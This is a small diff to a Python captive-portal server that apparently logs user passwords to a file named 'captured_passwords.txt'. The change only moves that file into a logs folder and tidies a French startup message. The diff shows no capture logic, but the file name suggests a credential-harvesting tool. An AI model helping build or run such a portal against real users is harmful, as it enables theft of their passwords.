@@ -5,7 +5,7 @@ import urllib.parse
 import os
 from datetime import datetime
 
-LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "captured_passwords.txt")
+LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs/captured_passwords.txt")
 
 class CaptiveHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
@@ -103,5 +103,5 @@ class CaptiveHandler(http.server.SimpleHTTPRequestHandler):
 if __name__ == "__main__":
     PORT = 8080
     with socketserver.TCPServer(("", PORT), CaptiveHandler) as httpd:
-        print("Portail captif lancé sur le port", PORT)
+        print(f"Portail captif lancé sur le port {PORT}")
         httpd.serve_forever()
